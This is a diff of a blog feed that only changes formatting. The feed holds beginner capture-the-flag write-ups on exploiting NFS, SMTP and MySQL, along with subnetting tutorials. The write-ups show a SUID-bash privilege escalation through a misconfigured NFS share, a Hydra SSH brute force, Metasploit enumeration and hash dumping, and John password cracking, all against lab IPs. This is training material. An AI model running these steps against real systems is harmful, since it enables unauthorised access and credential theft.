@@ -244,7 +244,7 @@ Here&amp;rsquo;s an example of a small enterprise network. There are two LANs in
 <p>VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.</p>
 <br>
 <div style="text-align: center"><img src="./image-34.png"></div>
-<p>Here&rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto. We are assigned the <strong>192.168.1.0/24</strong> network and must divide it into 5 subnets to provide IP addresses for all hosts in the enterprise network.</p>
+<p>Here&rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto. We are assigned the <code>192.168.1.0/24</code> network and must divide it into 5 subnets to provide IP addresses for all hosts in the enterprise network.</p>
 <p>If we were to try this with FLSM (Fixed-length subnet masks), we would need to borrow 3 bits to make enough subnets. That would leave 5 host bits left. 5 host bits only allow 30 host addresses, so that&rsquo;s not enough addresses for Tokyo LAN A and Toronto LAN B.</p>
 <p>However, if we use VLSM we can assign different subnet sizes to each LAN, which will allow us to make sure each LAN has enough addresses available.</p>
 <br>
@@ -400,7 +400,7 @@ Notice that each subnet uses a different prefix length. If we tried to use the s
 NFS Understanding NFS What does NFS stand for?
 Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
 Mounting By using NFS, users and programs can access files on remote systems as if they were local files.</description>
-      <content:encoded><![CDATA[<p>This is the second series on Network Services in the <strong>Network Exploitation Basics</strong> module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.</p>
+      <content:encoded><![CDATA[<p>This is the second series on Network Services in the <code>Network Exploitation Basics</code> module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.</p>
 <h3 id="nfs">NFS</h3>
 <hr>
 <h4 id="understanding-nfs">Understanding NFS</h4>
@@ -495,12 +495,12 @@ A computer running Windows Server can act as an NFS file server for other non-Wi
 </li>
 <li>
 <p>Mounting NFS shares</p>
-<p>Your client&rsquo;s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you&rsquo;ve created this mount point, you can use the &ldquo;mount&rdquo; command to connect the NFS share to the mount point on your machine like so: <strong>sudo mount -t nfs IP:share /tmp/mount/ -nolock</strong></p>
-<p><strong>sudo</strong> : run as root <br>
-<strong>mount</strong> : execute the mount command <br>
-<strong>-t nfs</strong> : type of device to mount, then specifying that it&rsquo;s NFS <br>
-<strong>IP:share</strong>: the IP address of the NFS server, and the name of the share we wish to mount <br>
-<strong>-nolock</strong>: specifies not to use NLM locking</p>
+<p>Your client&rsquo;s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you&rsquo;ve created this mount point, you can use the &ldquo;mount&rdquo; command to connect the NFS share to the mount point on your machine like so: <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></p>
+<p><code>sudo</code> : run as root <br>
+<code>mount</code> : execute the mount command <br>
+<code>-t nfs</code> : type of device to mount, then specifying that it&rsquo;s NFS <br>
+<code>IP:share</code>: the IP address of the NFS server, and the name of the share we wish to mount <br>
+<code>-nolock</code>: specifies not to use NLM locking</p>
 </li>
 </ol>
 <br>
@@ -563,7 +563,7 @@ A computer running Windows Server can act as an NFS file server for other non-Wi
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs</span></span></code></pre></div>
 <br>
-<p>Now, use <strong>/usr/sbin/showmount -e [IP]</strong> to list the NFS shares, what is the name of the visible share?</p>
+<p>Now, use <code>/usr/sbin/showmount -e [IP]</code> to list the NFS shares, what is the name of the visible share?</p>
 
 
 
@@ -582,7 +582,7 @@ A computer running Windows Server can act as an NFS file server for other non-Wi
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>/home <span style="color:#89b4fa">\*</span></span></span></code></pre></div>
 <br>
 Time to mount the share to our local machine!
-<p>First, use <strong>mkdir /tmp/mount</strong> to create a directory on your machine to mount the share to. This is in the /tmp directory - so be aware that it will be removed on restart.</p>
+<p>First, use <code>mkdir /tmp/mount</code> to create a directory on your machine to mount the share to. This is in the /tmp directory - so be aware that it will be removed on restart.</p>
 <p>Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share – what is the name of the folder inside?</p>
 
 
@@ -640,11 +640,11 @@ Time to mount the share to our local machine!
 
 
 <pre tabindex="0"><code>id_rsa</code></pre>
-<p><strong>id_rsa</strong> is the default name of an SSH identity file.</p>
+<p><code>id_rsa</code> is the default name of an SSH identity file.</p>
 <br>
-<p>Copy this file to a different location your local machine, and change the permission to &ldquo;600&rdquo; using <strong>chmod 600 [file]</strong>.</p>
+<p>Copy this file to a different location your local machine, and change the permission to &ldquo;600&rdquo; using <code>chmod 600 [file]</code>.</p>
 <p>Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.</p>
-<p>Can we log into the machine using <strong>ssh -i <key-file> <username>@&lt;ip&gt; ?</strong> (Y/N).</p>
+<p>Can we log into the machine using <code>ssh -i &lt;key-file&gt; &lt;username&gt;@\&lt;ip&gt; ?</code> (Y/N).</p>
 
 
 
@@ -695,7 +695,7 @@ Time to mount the share to our local machine!
 <h5 id="suid">SUID</h5>
 <p>So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
 <p>Due to compatibility reasons, we will obtain the bash executable directly from the target machine.
-With the key obtained in the previous task, we can use SCP with the command <strong>scp -i key_name <a href="mailto:username@10.10.14.168">username@10.10.14.168</a>:/bin/bash ~/Downloads/bash</strong> to download it onto our attacking machine.</p>
+With the key obtained in the previous task, we can use SCP with the command <code>scp -i key_name username@10.10.14.168:/bin/bash ~/Downloads/bash</code> to download it onto our attacking machine.</p>
 <p>Here&rsquo;s a step by step of the actions we&rsquo;re taking, and how they all tie together to allow us to gain a root shell:</p>
 <ol>
 <li>NFS Access</li>
@@ -743,7 +743,7 @@ With the key obtained in the previous task, we can use SCP with the command <str
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>bash
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chown root bash</span></span></code></pre></div>
 <br>
-<p>Now, we&rsquo;re going to add the SUID bit permission to the bash executable we just copied to the share using <strong>sudo chmod +[permission] bash</strong>. What letter do we use to set the SUID bit set using chmod?</p>
+<p>Now, we&rsquo;re going to add the SUID bit permission to the bash executable we just copied to the share using <code>sudo chmod +[permission] bash</code>. What letter do we use to set the SUID bit set using chmod?</p>
 
 
 
@@ -751,13 +751,13 @@ With the key obtained in the previous task, we can use SCP with the command <str
 
 
 <pre tabindex="0"><code>s</code></pre>
-<p>The letter <strong>s</strong> is used to set the setuid (SUID) bit using the <strong>chmod</strong> command in Linux:</p>
+<p>The letter <code>s</code> is used to set the setuid (SUID) bit using the <code>chmod</code> command in Linux:</p>
 <ul>
 <li>chmod u+s &lt;/path/to/the/file&gt;: Sets the setuid bit symbolically</li>
 <li>chmod u-s: Removes the setuid bit</li>
 </ul>
 <br>
-<p>Let&rsquo;s do a sanity check, let&rsquo;s check the permissions of the <strong>bash</strong> executable using <strong>ls -la bash</strong>. What does the permission set look like? Make sure that it ends with -sr-x.</p>
+<p>Let&rsquo;s do a sanity check, let&rsquo;s check the permissions of the <code>bash</code> executable using <code>ls -la bash</code>. What does the permission set look like? Make sure that it ends with -sr-x.</p>
 
 
 
@@ -1027,7 +1027,7 @@ Where does the SMTP server send the email if the recipient's server is not avail
 
 <pre tabindex="0"><code>Postfix</code></pre>
 <br>
-<p>Good! We&rsquo;ve now got a good amount of information on the target system to move onto the next stage. Let&rsquo;s search for the module <strong>smtp_enum</strong>, what is the full module name?</p>
+<p>Good! We&rsquo;ve now got a good amount of information on the target system to move onto the next stage. Let&rsquo;s search for the module <code>smtp_enum</code>, what is the full module name?</p>
 
 
 
@@ -1055,8 +1055,8 @@ Where does the SMTP server send the email if the recipient's server is not avail
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
 <br>
-<p>We&rsquo;re going to be using the <strong>top-usernames-shortlist.txt</strong> wordlist from the usernames subsection of seclists (/usr/share/wordlists/SecLists/usernames if you have it installed).
-Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or Parrot you can install seclists with: <strong>sudo apt install seclists</strong>.</p>
+<p>We&rsquo;re going to be using the <code>top-usernames-shortlist.txt</code> wordlist from the usernames subsection of seclists (/usr/share/wordlists/SecLists/usernames if you have it installed).
+Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or Parrot you can install seclists with: <code>sudo apt install seclists</code>.</p>
 <br>
 <p>What option do we need to set to the wordlist&rsquo;s path?</p>
 
@@ -1138,17 +1138,17 @@ Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or 
 <li>The type of SMTP server and Operating System running.</li>
 </ol>
 <p>We know from our port scan, that the only other open port on this machine is an SSH login. We&rsquo;re going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.</p>
-<p>There is a wide array of customizability when it comes to using Hydra. Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the <strong>/usr/share/wordlists directory</strong> – If you would like to browse and find a different wordlists to the widely used &ldquo;rockyou.txt&rdquo;.</p>
+<p>There is a wide array of customizability when it comes to using Hydra. Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the <code>/usr/share/wordlists directory</code> – If you would like to browse and find a different wordlists to the widely used &ldquo;rockyou.txt&rdquo;.</p>
 <p>The syntax for the command we&rsquo;re going to use to find the password is this:</p>
-<p><strong>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh</strong></p>
+<p><code>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh</code></p>
 <ul>
-<li><strong>hydra</strong>: runs the hydra tool</li>
-<li><strong>-t 16</strong>: number of parallel connections per target</li>
-<li><strong>-l [user]</strong>: points to the user whose account you&rsquo;re trying to compromise</li>
-<li><strong>-P [path to dictionary]</strong>: points to the file containing the list of possible passwords</li>
-<li><strong>-vV</strong>: sets verbose mode to very verbose, shows the login+pass combination for each attempt</li>
-<li><strong>[machine ip]</strong>: the IP address of the target machine</li>
-<li><strong>ssh / protocol</strong>: sets the protocol</li>
+<li><code>hydra</code>: runs the hydra tool</li>
+<li><code>-t 16</code>: number of parallel connections per target</li>
+<li><code>-l [user]</code>: points to the user whose account you&rsquo;re trying to compromise</li>
+<li><code>-P [path to dictionary]</code>: points to the file containing the list of possible passwords</li>
+<li><code>-vV</code>: sets verbose mode to very verbose, shows the login+pass combination for each attempt</li>
+<li><code>[machine ip]</code>: the IP address of the target machine</li>
+<li><code>ssh / protocol</code>: sets the protocol</li>
 </ul>
 <br>
 <p>What is the password of the user we found during our enumeration stage?</p>
@@ -1293,7 +1293,7 @@ What language is MySQL based on?
 <pre tabindex="0"><code>Facebook</code></pre>
 <br>
 <h4 id="enumerating-mysql">Enumerating MySQL</h4>
-<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. For the sake of the scenario, we&rsquo;re going to assume that we found the <strong>credentials: &ldquo;root:password&rdquo;</strong> while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
+<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. For the sake of the scenario, we&rsquo;re going to assume that we found the <code>credentials: &quot;root:password&quot;</code> while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
 <br>
 <p>As always, let&rsquo;s start out with a port scan, so we know what port the service we&rsquo;re trying to attack is running on. What port is MySQL using?</p>
 
@@ -1313,7 +1313,7 @@ What language is MySQL based on?
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1</span></span></code></pre></div>
 <br>
-<p>Good, now – we think we have a set of credentials. Let&rsquo;s double check that by manually connecting to the MySQL server. We can do this using command <strong>mysql -h [IP] -u [username] -p</strong>.</p>
+<p>Good, now – we think we have a set of credentials. Let&rsquo;s double check that by manually connecting to the MySQL server. We can do this using command <code>mysql -h [IP] -u [username] -p</code>.</p>
 
 
 
@@ -1382,7 +1382,7 @@ What language is MySQL based on?
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>msf6 &gt;</span></span></code></pre></div>
 <br>
-<p>We&rsquo;re going to be using the <strong>mysql_sql</strong> module.
+<p>We&rsquo;re going to be using the <code>mysql_sql</code> module.
 Search for, select and list the options it needs. What three options do we need to set? (in descending order).</p>
 
 
@@ -1441,7 +1441,7 @@ USERNAME</code></pre>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>
 <br>
-<p>Run the exploit. By default it will test with the <strong>select version()</strong> command, what result does this give you?</p>
+<p>Run the exploit. By default it will test with the <code>select version()</code> command, what result does this give you?</p>
 
 
 
@@ -1520,11 +1520,11 @@ USERNAME</code></pre>
 </ol>
 <br>
 <p><em>Schema</em>
-In MySQL, physically, a <strong>schema</strong> is synonymous with a <strong>database</strong>. You can substitute the keyword schema instead of database in MySQL SQL syntax, for example using <strong>CREATE SCHEMA</strong> instead of <strong>CREATE DATABASE</strong>. Some other database products draw a distinction.</p>
+In MySQL, physically, a <code>schema</code> is synonymous with a <code>database</code>. You can substitute the keyword schema instead of database in MySQL SQL syntax, for example using <code>CREATE SCHEMA</code> instead of <code>CREATE DATABASE</code>. Some other database products draw a distinction.</p>
 <p><em>Hashes</em>
 Hashes are the product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data.</p>
 <br>
-<p>First, let&rsquo;s search for and select the <strong>mysql_schemadump</strong> module. What&rsquo;s the module&rsquo;s full name?</p>
+<p>First, let&rsquo;s search for and select the <code>mysql_schemadump</code> module. What&rsquo;s the module&rsquo;s full name?</p>
 
 
 
@@ -1698,7 +1698,7 @@ What is the user/hash combination string?</p>
 
 <pre tabindex="0"><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <br>
-<p>Now, we need to crack the password! Let&rsquo;s try <strong>John the Ripper</strong> against it using: <strong>john hash.txt</strong>. What is the password of the user we found?</p>
+<p>Now, we need to crack the password! Let&rsquo;s try <code>John the Ripper</code> against it using: <code>john hash.txt</code>. What is the password of the user we found?</p>
 
 
 
@@ -1780,24 +1780,24 @@ What is the user/hash combination string?</p>
       <description>Divide the 192.168.1.0/24 network into 4 subnets that can accommodate 45 number of hosts.
 First, we determined that the prefix length needs to be /26 because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is 2^n - 2, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts.</description>
       <content:encoded><![CDATA[<div style="text-align: center"><img src="./image-30.png"></div>
-<p>Divide the <strong>192.168.1.0/24</strong> network into 4 subnets that can accommodate 45 number of hosts.</p>
-<p>First, we determined that the prefix length needs to be <strong>/26</strong> because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is <strong>2^n - 2</strong>, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts. Therefore, we need 2^6 - 2 = 62, which isn&rsquo;t exactly 45 but is sufficient. To accommodate 45 hosts, we need 6 host bits. This makes the prefix length /26, since we subtract the 6 host bits from the total address length of 32.</p>
-<p>The network address of <strong>subnet 1</strong> is 192.168.1.0/26. To find the broadcast address of subnet 1, we first convert the subnet 1 address to binary:
-<strong>11000000.10101000.00000001.00000000</strong></p>
+<p>Divide the <code>192.168.1.0/24</code> network into 4 subnets that can accommodate 45 number of hosts.</p>
+<p>First, we determined that the prefix length needs to be <code>/26</code> because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts. Therefore, we need 2^6 - 2 = 62, which isn&rsquo;t exactly 45 but is sufficient. To accommodate 45 hosts, we need 6 host bits. This makes the prefix length /26, since we subtract the 6 host bits from the total address length of 32.</p>
+<p>The network address of <code>subnet 1</code> is 192.168.1.0/26. To find the broadcast address of subnet 1, we first convert the subnet 1 address to binary:
+<code>11000000.10101000.00000001.00000000</code></p>
 <p>Then, we change all the Host ID bits to 1, leaving the Network ID bits unchanged:
-<strong>11000000.10101000.00000001.00111111</strong></p>
+<code>11000000.10101000.00000001.00111111</code></p>
 <p>Converting these binary bits back to dotted decimal format gives us the broadcast address (the highest address in this subnet) of subnet 1.
-<strong>192.168.1.63/26</strong>.</p>
+<code>192.168.1.63/26</code>.</p>
 <p>So, the address range of subnet1 is 192.168.1.0 - 192.168.1.63.</p>
-<p>The network address of <strong>subnet 2</strong> will be 1 higher than the broadcast address of <strong>subnet 1</strong>. So, 192.168.1.64/26.</p>
-<p>192.168.1.64 in binary is <strong>11000000.10101000.00000001.01000000</strong>.
-Covert all the host bits to 1s. <strong>11000000.10101000.00000001.01111111</strong></p>
-<p>Convert the binary bits back to dotted decimal and it becomes <strong>192.168.1.127</strong>.</p>
+<p>The network address of <code>subnet 2</code> will be 1 higher than the broadcast address of <code>subnet 1</code>. So, 192.168.1.64/26.</p>
+<p>192.168.1.64 in binary is <code>11000000.10101000.00000001.01000000</code>.
+Covert all the host bits to 1s. <code>11000000.10101000.00000001.01111111</code></p>
+<p>Convert the binary bits back to dotted decimal and it becomes <code>192.168.1.127</code>.</p>
 <p>The address range of subnet 2 is 192.168.1.64 to 192.168.1.127.</p>
 <p>You might have noticed that each subnet is 64 bits apart. To find next subnet&rsquo;s network address, simply add this value to the current subnet.</p>
 <p>Take the image below as an example.</p>
 <div style="text-align: center"><img src="./image-31.png"></div>
-Let's just focus on the last octet here. The last octet in binary is **00000000**. The first 2 bits is the network ID, which we borrowed to expand the network ID and the last 6 bits is the host ID. The trick to find each subnet's network address is to remember the value of last bit of the network portion, which is 64, in this case.
+<p>Let&rsquo;s just focus on the last octet here. The last octet in binary is <code>00000000</code>. The first 2 bits is the network ID, which we borrowed to expand the network ID and the last 6 bits is the host ID. The trick to find each subnet&rsquo;s network address is to remember the value of last bit of the network portion, which is 64, in this case.</p>
 <br>
 <br>
 <br>
@@ -1813,18 +1813,18 @@ For the number of subnets, each additional bit that you borrow doubles the numbe
 <div style="text-align: center"><img src="./image-33.png"></div>
 we have to borrow 7 bits. 16 + 7 = /23.
 <ol start="2">
-<li>You have been given the <strong>172.22.0.0/16</strong> network. You are required to divide the network into 500 separate subnets. What prefix should you use?</li>
+<li>You have been given the <code>172.22.0.0/16</code> network. You are required to divide the network into 500 separate subnets. What prefix should you use?</li>
 </ol>
 <p>First of all, looking at the /16 prefix length, it seems like subnetting needs to be done in a Class B network. To create 500 subnets, we need to determine how many bits to borrow.</p>
 <p>2^8 is 256, and 2^9 is 512. Therefore, we need to borrow 9 bits. Starting from a Class B network, which has a /16 prefix length, we add 9 bits to get a /25 prefix length. This means we should use a /25 prefix length.</p>
 <ol start="3">
-<li>You have been given the <strong>172.18.0.0/16</strong> network. Your company requires 250 subnets with the same number of hosts per subnet. What prefix length should you use?</li>
+<li>You have been given the <code>172.18.0.0/16</code> network. Your company requires 250 subnets with the same number of hosts per subnet. What prefix length should you use?</li>
 </ol>
-<p><strong>/24</strong> . 2^8 = 256 subnets could be made. Also /24 prefix length will leave 8, the number of host bits which could lead to 2^8 - 2, 254.</p>
+<p><code>/24</code> . 2^8 = 256 subnets could be made. Also /24 prefix length will leave 8, the number of host bits which could lead to 2^8 - 2, 254.</p>
 <ol start="4">
 <li>
 <p>What subnet does host 172.25.217.192/21 belong to?</p>
-<p>Let&rsquo;s convert <strong>172.25.217.192</strong> to binary bits.
+<p>Let&rsquo;s convert <code>172.25.217.192</code> to binary bits.
 10101100.00011001.11011001.11000000</p>
 <p>change all of the host bits to 0.
 10101100.00011001.11011000.00000000</p>
@@ -1834,7 +1834,7 @@ we have to borrow 7 bits. 16 + 7 = /23.
 </ol>
 <h3 id="quiz">Quiz</h3>
 <hr>
-<p>Q1. You have been given the <strong>172.30.0.0/16</strong> network. Your company requires 100 subnets with at least 500 hosts per subnet. What prefix length should you use?</p>
+<p>Q1. You have been given the <code>172.30.0.0/16</code> network. Your company requires 100 subnets with at least 500 hosts per subnet. What prefix length should you use?</p>
 
 
 
@@ -1843,7 +1843,7 @@ we have to borrow 7 bits. 16 + 7 = /23.
 
 <pre tabindex="0"><code>/23</code></pre>
 <br>
-<p>Q2. What subnet does host <strong>172.21.111.201/20</strong> belong to?</p>
+<p>Q2. What subnet does host <code>172.21.111.201/20</code> belong to?</p>
 
 
 
@@ -1852,9 +1852,9 @@ we have to borrow 7 bits. 16 + 7 = /23.
 
 <pre tabindex="0"><code>172.21.96.0/20</code></pre>
 <ul>
-<li>Convert the address to binary: <strong>10101100.00010101.01101111.11001001</strong></li>
-<li>Change the host bits to 0s. Since the prefix length is <strong>/20</strong> , we can set the last 12 bits to 0s: <strong>10101100.00010101.01100000.00000000</strong></li>
-<li>Convert the binary bits back to dotted decimal: <strong>172.21.96.0/20</strong></li>
+<li>Convert the address to binary: <code>10101100.00010101.01101111.11001001</code></li>
+<li>Change the host bits to 0s. Since the prefix length is <code>/20</code> , we can set the last 12 bits to 0s: <code>10101100.00010101.01100000.00000000</code></li>
+<li>Convert the binary bits back to dotted decimal: <code>172.21.96.0/20</code></li>
 </ul>
 <br>
 <p>Q3. What is the broadcast address of the network 192.168.91.78/26 belongs to?</p>
@@ -1868,17 +1868,17 @@ we have to borrow 7 bits. 16 + 7 = /23.
 <ul>
 <li>Convert the address to binary bits:
 <ul>
-<li><strong>11000000.10101000.01011011.01001110</strong>.</li>
+<li><code>11000000.10101000.01011011.01001110</code>.</li>
 </ul>
 </li>
 <li>Change all of the host bits to 0s to find the network address of the subnet:
 <ul>
-<li><strong>11000000.10101000.01011011.01000000</strong>.</li>
+<li><code>11000000.10101000.01011011.01000000</code>.</li>
 </ul>
 </li>
 <li>Change all of the host bits to 1s to find the broadcast address of the subnet:
 <ul>
-<li><strong>11000000.10101000.01011011.01111111</strong>.</li>
+<li><code>11000000.10101000.01011011.01111111</code>.</li>
 </ul>
 </li>
 <li>Change the binary bits back to dotted decimal
@@ -1889,7 +1889,7 @@ we have to borrow 7 bits. 16 + 7 = /23.
 </li>
 </ul>
 <br>
-<p>Q4. You divide the <strong>172.16.0.0/16</strong> network into 4 subnets of equal size. Identify the network and broadcast addresses of the second subnet.</p>
+<p>Q4. You divide the <code>172.16.0.0/16</code> network into 4 subnets of equal size. Identify the network and broadcast addresses of the second subnet.</p>
 
 
 
@@ -1921,7 +1921,7 @@ broadcast address: 172.16.127.255/18</code></pre>
 
 
 <pre tabindex="0"><code>64</code></pre>
-<p>To divide the network into subnets that each accommodate 1,000 hosts, we first need to determine how many bits are required for the hosts. The formula for calculating the number of hosts is <strong>2^n - 2</strong>, where n is the number of host bits. If we use 10 bits for the hosts, we get 2^10 - 2 = 1,022 hosts, which is more than enough.</p>
+<p>To divide the network into subnets that each accommodate 1,000 hosts, we first need to determine how many bits are required for the hosts. The formula for calculating the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If we use 10 bits for the hosts, we get 2^10 - 2 = 1,022 hosts, which is more than enough.</p>
 <p>The maximum prefix length is /32. Subtracting the 10 host bits from 32 gives us a prefix length of /22. Therefore, the subnet mask of the subnets will be /22. The original subnet mask was /16, so we&rsquo;ve borrowed 6 bits from the original network for subnetting. With these 6 additional bits, we can create 64 (2^6) subnets.</p>
 ]]></content:encoded>
     </item>
@@ -1939,9 +1939,9 @@ A subnet refers to a portioned network within an IP address that divides the net
 <h3 id="ipv4-address-classes">IPv4 Address Classes</h3>
 <p>There are 5 different IPv4 classes</p>
 <div style="text-align: center"><img src="./ip table.png"></div>
-<p>A <strong>subnet</strong> refers to a portioned network within an IP address that divides the network area. The tool used to create these subnets is called a <strong>Subnet Mask</strong>. In other words, the Subnet Mask serves to separate the Network ID and the Host ID within the IP address system.</p>
-<p>For example, as shown in the image above, a <strong>Class C</strong> network has the first 24 bits representing the Network ID and the last 8 bits representing the Host ID. In this case, the actual number of assignable hosts within the 8-bit Host ID is 2^8 - 2 = 254.</p>
-<p>The formula for the actual number of assignable hosts is <strong>2^n - 2</strong>, where n is the number of bits in the Host ID. But why do we subtract 2? This is because we must exclude the <strong>Network Address</strong> and the <strong>Broadcast Address</strong>. These two addresses cannot be assigned to hosts.</p>
+<p>A <code>subnet</code> refers to a portioned network within an IP address that divides the network area. The tool used to create these subnets is called a <code>Subnet Mask</code>. In other words, the Subnet Mask serves to separate the Network ID and the Host ID within the IP address system.</p>
+<p>For example, as shown in the image above, a <code>Class C</code> network has the first 24 bits representing the Network ID and the last 8 bits representing the Host ID. In this case, the actual number of assignable hosts within the 8-bit Host ID is 2^8 - 2 = 254.</p>
+<p>The formula for the actual number of assignable hosts is <code>2^n - 2</code>, where n is the number of bits in the Host ID. But why do we subtract 2? This is because we must exclude the <code>Network Address</code> and the <code>Broadcast Address</code>. These two addresses cannot be assigned to hosts.</p>
 <br>
 <h3 id="cidr-classless-inter-domain-routing">CIDR (Classless Inter-Domain Routing)</h3>
 <p>The class system has a critical problem, that is, it wastes a lot of IP addresses. When the Internet was first created, the creators did not predict that the Internet would become as large as it is today. This resulted in wasted address space.</p>
@@ -1952,17 +1952,17 @@ A subnet refers to a portioned network within an IP address that divides the net
 <li>Class B = /16</li>
 <li>Class C = /24</li>
 </ul>
-<p>were removed. This allowed larger networks to be split into smaller networks, allowing greater efficiency. These small networks are called <strong>subnetworks</strong> or <strong>subnets</strong> .</p>
+<p>were removed. This allowed larger networks to be split into smaller networks, allowing greater efficiency. These small networks are called <code>subnetworks</code> or <code>subnets</code> .</p>
 <br>
 <p>Wasted IP addresses example</p>
 <div style="text-align: center"><img src="./image-23.png"></div>
-<p>Here, we have two routers that we want to connect. This network is a <strong>point-to-point</strong> network, so we don&rsquo;t need many network blocks. Therefore, we allocate a Class C network. Since we allocated a Class C network, the Network ID will be 24 bits, and the Host ID will be 8 bits, giving us a total of 2^8 = 256 addresses. However, subtracting the network address (203.0.113.0) and the broadcast address (203.0.113.255), we have a total of 254 usable addresses.</p>
+<p>Here, we have two routers that we want to connect. This network is a <code>point-to-point</code> network, so we don&rsquo;t need many network blocks. Therefore, we allocate a Class C network. Since we allocated a Class C network, the Network ID will be 24 bits, and the Host ID will be 8 bits, giving us a total of 2^8 = 256 addresses. However, subtracting the network address (203.0.113.0) and the broadcast address (203.0.113.255), we have a total of 254 usable addresses.</p>
 <p>But let&rsquo;s say we are using the classful addressing system without CIDR introduced. In this case, out of the 254 addresses, if we assign one address to R1 (e.g., 203.0.113.1) and one address to R2 (e.g., 203.0.113.2), then 252 addresses will be unused and wasted.</p>
 <p>Let&rsquo;s look at another example.</p>
